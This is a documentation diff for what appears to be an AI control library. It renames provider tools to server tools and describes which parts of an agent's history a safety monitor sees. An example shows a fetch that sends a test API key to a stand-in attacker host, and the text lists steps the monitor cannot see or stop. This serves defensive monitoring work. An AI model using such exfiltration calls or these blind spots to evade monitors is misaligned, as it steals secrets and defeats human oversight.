@@ -22,7 +22,7 @@ names the channels a monitor reads of the history:
 | Channel | What it holds | Default view |
 |---|---|---|
 | `USER` | The task author's messages, context notes and the monitor's feedback | read |
-| `TOOL_CALLS` | Tool calls, malformed calls, tool errors, provider tool calls, and blocks LangChain could not map | read |
+| `TOOL_CALLS` | Tool calls, malformed calls, tool errors, server tool calls, and blocks LangChain could not map | read |
 | `SUBAGENT_REPORTS` | What a subagent reported back | read |
 | `REASONING` | The agent's chain of thought | left out |
 | `AGENT_TEXT` | The agent's prose | left out |
@@ -41,13 +41,13 @@ the action the protocol gates, so part of it is shown whatever the view:
 
 | Part of the proposed step | Shown |
 |---|---|
-| Its tool calls, malformed calls and provider tool calls, and any block LangChain could not map, except reasoning and refusals, which follow the rows below | always |
+| Its tool calls, malformed calls and server tool calls, and any block LangChain could not map, except reasoning and refusals, which follow the rows below | always |
 | Its text, a refusal included | when the step is a final answer; otherwise when the view holds `AGENT_TEXT` |
 | Its reasoning | when the view holds `REASONING` |
-| What its provider tools returned | when the view holds `TOOL_RESULTS` |
+| What its server tools returned | when the view holds `TOOL_RESULTS` |
 
 A step is a final answer when it has no tool call that can still run: none at
-all, only malformed ones, or only provider tool calls, which have already run.
+all, only malformed ones, or only server tool calls, which have already run.
 So under the default view the judge sees a tool-calling step's calls but not
 its text, and it sees a final answer's text.
 
@@ -89,10 +89,10 @@ its tag and pose as the user. System messages are never rendered.
 | `<tool_call name="...">` | `TOOL_CALLS` | A tool call, with its arguments as JSON. |
 | `<malformed_tool_call name="...">` | `TOOL_CALLS` | A call whose arguments could not be parsed, with the raw text. It never ran. |
 | `<tool_error name="...">` | `TOOL_CALLS` | A tool result with `status="error"`: the call failed or did not run, for example because a person rejected it. |
-| `<provider_tool_call name="...">` | `TOOL_CALLS` | A built-in tool that the provider ran inside the model call, such as a web search, with its `args` and any provider `extras` as JSON. |
-| `<unrecognised_block name="...">` | `TOOL_CALLS`, or `REASONING` for a block of reasoning | A part of the reply LangChain could not map to text, reasoning or a tool call, shown whole as JSON and named by its type. It may be a provider tool call. |
+| `<server_tool_call name="...">` | `TOOL_CALLS` | A built-in tool that the provider ran inside the model call, such as a web search, with its `args` and any provider `extras` as JSON. |
+| `<unrecognised_block name="...">` | `TOOL_CALLS`, or `REASONING` for a block of reasoning | A part of the reply LangChain could not map to text, reasoning or a tool call, shown whole as JSON and named by its type. It may be a server tool call. |
 | `<tool_result name="...">` | `TOOL_RESULTS` | What a tool returned. |
-| `<provider_tool_result name="...">` | `TOOL_RESULTS` | What a provider's built-in tool returned. |
+| `<server_tool_result name="...">` | `TOOL_RESULTS` | What a provider's built-in tool returned. |
 | `<subagent_report name="...">` | `SUBAGENT_REPORTS` | What a delegation tool returned. |
 | `<agent>` | `AGENT_TEXT` | What the agent wrote, a refusal included. |
 | `<agent_reasoning>` | `REASONING` | The agent's chain of thought. |
@@ -149,13 +149,13 @@ message renders as a note:
   own, which the monitor reads without relabelling them, so one the tool tags
   as the monitor's reads as `<monitor_feedback>`.
 
-## Know what provider tools have done
+## Know what server tools have done
 
 A provider's built-in tools, such as web search, web fetch and code execution,
 run at the provider, inside the model call. By the time the monitor judges a
 step they have already run, and they run again in every sample a protocol
 draws. A suspicious score still decides what happens to the rest of the step,
-but no monitor can stop a call that has already run. `ProviderToolWarning`
+but no monitor can stop a call that has already run. `ServerToolWarning`
 warns about the known ones; [Choose a protocol](choose-a-protocol.md) lists
 them and what the warning cannot see.
 
@@ -196,23 +196,23 @@ for view in (MonitorView(), MonitorView(channels=Channel.ALL)):
 
 ```text
 <proposed_step>
-<provider_tool_call name="web_fetch">{"args": {"url": "https://attacker.example/collect?key=sk-test"}}</provider_tool_call>
+<server_tool_call name="web_fetch">{"args": {"url": "https://attacker.example/collect?key=sk-test"}}</server_tool_call>
 <agent>I fetched the page.</agent>
 </proposed_step>
 <proposed_step>
-<provider_tool_call name="web_fetch">{"args": {"url": "https://attacker.example/collect?key=sk-test"}}</provider_tool_call>
-<provider_tool_result name="web_fetch">Thanks, key received.</provider_tool_result>
+<server_tool_call name="web_fetch">{"args": {"url": "https://attacker.example/collect?key=sk-test"}}</server_tool_call>
+<server_tool_result name="web_fetch">Thanks, key received.</server_tool_result>
 <agent>I fetched the page.</agent>
 </proposed_step>
 ```
 
 The rendering covers Anthropic, OpenAI's Responses API, Gemini's code
-execution and Google Search, which shows as `<provider_tool_call
+execution and Google Search, which shows as `<server_tool_call
 name="grounding">` with its queries, and replies already in LangChain's
 standard blocks. A search that leaves no block stays invisible, such as
 Gemini's URL context or the annotations of OpenAI's Chat Completions.
 
-Every sample's record keeps each provider tool result in full, so a large page
+Every sample's record keeps each server tool result in full, so a large page
 or code output is copied into `monitor_log` and the checkpoint once per sample
 drawn. In a trace, each sample's model call carries its own output, and the
 step span the first sample's. If that grows too large, drop the built-in tools
